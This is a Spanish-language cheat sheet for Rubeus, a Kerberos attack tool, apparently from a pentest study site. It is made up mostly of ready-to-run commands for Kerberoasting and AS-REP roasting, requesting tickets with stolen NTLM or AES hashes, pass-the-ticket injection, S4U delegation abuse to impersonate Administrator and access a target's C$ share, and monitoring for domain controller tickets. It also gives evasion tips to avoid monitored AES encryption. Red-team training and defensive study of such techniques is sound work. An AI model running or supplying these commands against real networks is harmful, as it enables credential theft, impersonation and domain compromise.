title: "Rubeus Cheat Sheet"
description: "Herramienta en C# para interacción cruda con Kerberos: Roasting, Tickets y Delegación."
image: "/images/certs/ad-rubeus.png"

# Rubeus

**Rubeus** es una herramienta escrita en C# (parte de GhostPack) para la interacción directa con el protocolo Kerberos y el abuso de tickets. Es "OPSEC safe" en muchos aspectos y muy potente para ataques modernos.

[Repositorio Oficial](https://github.com/GhostPack/Rubeus)
[Versión Compilada](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

## Roasting Attacks

### Kerberoasting
Solicita tickets TGS para cuentas de servicio y los devuelve en formato "hashcat-friendly".

```powershell
# Básico (Salida a pantalla y archivo)
Rubeus.exe kerberoast /outfile:hashes.txt

# OpSec (Evitar cifrado AES que puede ser monitoreado)
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Usuario específico
Rubeus.exe kerberoast /user:<Username> /simple
```

### AS-REP Roasting
Busca usuarios sin pre-autenticación.

```powershell
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

## Gestión de Tickets

### Solicitar TGT (AskTGT)
Pide un TGT si tienes la contraseña o el hash (AES/RC4) de un usuario.

```powershell
# Con Password NTLM (RC4)
Rubeus.exe asktgt /user:<User> /domain:<Domain> /rc4:<NtlmHash> /ptt

# Con Password AES256 (Más común en entornos modernos)
Rubeus.exe asktgt /user:<User> /domain:<Domain> /aes256:<AesHash> /ptt
```
*Nota*: `/ptt` (Pass-the-Ticket) inyecta el ticket automáticamente en la sesión actual.

### Pass-the-Ticket (PTT)
Inyecta un ticket (archivo .kirbi o base64) en la sesión.

```powershell
Rubeus.exe ptt /ticket:<PathToKirbi_OR_Base64>
```

### Renovación de Tickets
Si tienes un TGT válido, puedes renovarlo (hasta el límite de renovación del dominio, usualmente 7 días).

```powershell
Rubeus.exe renew /ticket:<Base64Ticket> /ptt
```

## Delegación (S4U)

Uso de las extensiones S4U (Service for User) para ataques de **Constrained Delegation**. Si comprometes una cuenta que tiene delegación restringida, puedes impersonar a CUALQUIER usuario.

```powershell
# 1. Obtener TGT de la cuenta de servicio comprometida
Rubeus.exe asktgt /user:<ServiceAccount> /rc4:<Hash> /domain:<Domain> /outfile:tgt.kirbi

# 2. Ejecutar S4U2Self y S4U2Proxy para obtener ticket de admin para el servicio objetivo
Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.domain.local /ptt

# 3. Acceder
dir \\TargetMachine.domain.local\c$
```

## Monitor
Escucha el tráfico de tickets en la máquina local. Útil en combinación con el **Printer Bug** (SpoolSample) para capturar el TGT de un Controlador de Dominio si hay Unconstrained Delegation.

```powershell
Rubeus.exe monitor /interval:5 /filteruser:<TargetDC$>
```
